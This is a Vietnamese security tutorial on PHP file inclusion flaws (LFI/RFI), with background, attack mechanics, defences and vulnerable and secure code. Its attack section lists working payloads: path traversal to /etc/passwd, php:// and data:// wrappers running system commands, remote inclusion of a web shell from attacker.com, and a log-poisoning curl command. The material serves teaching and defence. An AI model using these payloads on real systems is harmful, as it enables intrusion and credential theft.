# Local/Remote File Inclusion (LFI/RFI)

> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-98, CWE-829 | **Nguồn**: PortSwigger, OWASP, CWE MITRE

## 🧱 Kiến thức Nền tảng

Nhiều ngôn ngữ lập trình web cho phép **include file động** tại runtime — tức là nạp và thực thi nội dung từ một file khác dựa trên tham số. Tính năng này phổ biến nhất trong PHP với các hàm:

- `include()` / `include_once()`: Nạp file, cảnh báo nếu không tìm thấy
- `require()` / `require_once()`: Nạp file, dừng script nếu không tìm thấy

Mục đích thiết kế là cho phép ứng dụng tải module, template, hoặc ngôn ngữ một cách linh hoạt. Ví dụ, một hệ thống multi-language:

```php
<?php
// Normal usage — loading language file based on user preference
$lang = $_GET['lang'];       // e.g., "en", "vi", "fr"
include("languages/" . $lang . ".php");
// Loads languages/en.php, languages/vi.php, etc.
?>
```

Tương tự, Python có `importlib`, Java có `ClassLoader`, nhưng PHP là mục tiêu chính vì `include()` **thực thi nội dung file** — bất kể nguồn gốc.

**LFI (Local File Inclusion)**: Include file từ hệ thống local server.
**RFI (Remote File Inclusion)**: Include file từ URL bên ngoài (yêu cầu `allow_url_include=On` trong php.ini).

## 🔍 Mô tả lỗ hổng

File Inclusion xảy ra khi ứng dụng cho phép user input kiểm soát đường dẫn file được include mà không validate đầy đủ. Hậu quả:

- **LFI**: Đọc file nhạy cảm (`/etc/passwd`, source code, config chứa credentials), thực thi log file đã bị poison.
- **RFI**: Nạp và thực thi web shell từ server của attacker — dẫn đến Remote Code Execution ngay lập tức.
- **Kết hợp với Log Poisoning**: Attacker chèn PHP code vào access log, sau đó include log file để thực thi.

## ⚔️ Cơ chế tấn công

**LFI — Path Traversal để đọc file hệ thống**:

```
# Basic path traversal to read /etc/passwd
https://victim.com/page.php?file=../../../../etc/passwd

# Null byte injection (PHP < 5.3.4) to bypass .php extension
https://victim.com/page.php?file=../../../../etc/passwd%00

# Double encoding to bypass basic filters
https://victim.com/page.php?file=..%252f..%252f..%252fetc/passwd
```

**PHP Wrappers — Đọc source code dưới dạng Base64**:

```
# php://filter wrapper to read source code without executing it
https://victim.com/page.php?file=php://filter/convert.base64-encode/resource=config.php
# Returns base64-encoded content of config.php (contains DB credentials)

# php://input wrapper for direct code execution (requires allow_url_include)
POST /page.php?file=php://input
Body: <?php system('whoami'); ?>

# data:// wrapper for inline code execution
https://victim.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

**RFI — Remote shell inclusion**:

```
# Host a PHP web shell on attacker's server
# shell.txt contains: <?php system($_GET['cmd']); ?>

https://victim.com/page.php?file=http://attacker.com/shell.txt
# PHP fetches and executes the remote file

# Execute commands through the included shell
https://victim.com/page.php?file=http://attacker.com/shell.txt&cmd=id
```

**LFI + Log Poisoning**:

```
# Step 1: Poison the access log with PHP code via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" https://victim.com/

# Step 2: Include the poisoned log file
https://victim.com/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami
```

## 🛡️ Biện pháp phòng thủ

1. **Whitelist file names**: Chỉ cho phép include từ danh sách file được định nghĩa trước, không dùng user input trực tiếp.
2. **Disable `allow_url_include`**: Tắt trong php.ini để ngăn chặn RFI hoàn toàn.
3. **Sử dụng `basename()`**: Loại bỏ path traversal sequences (`../`).
4. **`open_basedir` restriction**: Giới hạn PHP chỉ truy cập file trong thư mục ứng dụng.
5. **Chuyển sang template engine**: Sử dụng Twig, Blade thay vì `include()` trực tiếp.

## 💻 Code Example

```php
<?php
// === VULNERABLE CODE ===
$page = $_GET['page'];
// DANGER: User input directly controls file inclusion
include("templates/" . $page);
// Attack: ?page=../../../../etc/passwd
// Attack: ?page=php://filter/convert.base64-encode/resource=../config.php


// === SECURE CODE ===

// Whitelist of allowed pages
$allowed_pages = [
    'home'    => 'home.php',
    'about'   => 'about.php',
    'contact' => 'contact.php',
];

$page = $_GET['page'] ?? 'home';

// Only include files from the predefined whitelist
if (array_key_exists($page, $allowed_pages)) {
    $safe_path = __DIR__ . '/templates/' . $allowed_pages[$page];

    // Verify resolved path is within templates directory
    $real_path = realpath($safe_path);
    $base_dir  = realpath(__DIR__ . '/templates/');

    if ($real_path && strpos($real_path, $base_dir) === 0) {
        include($real_path);
    } else {
        http_response_code(403);
        echo "Access denied";
    }
} else {
    http_response_code(404);
    echo "Page not found";
}
?>
```

## 📚 Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/file-path-traversal
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- CWE: https://cwe.mitre.org/data/definitions/98.html
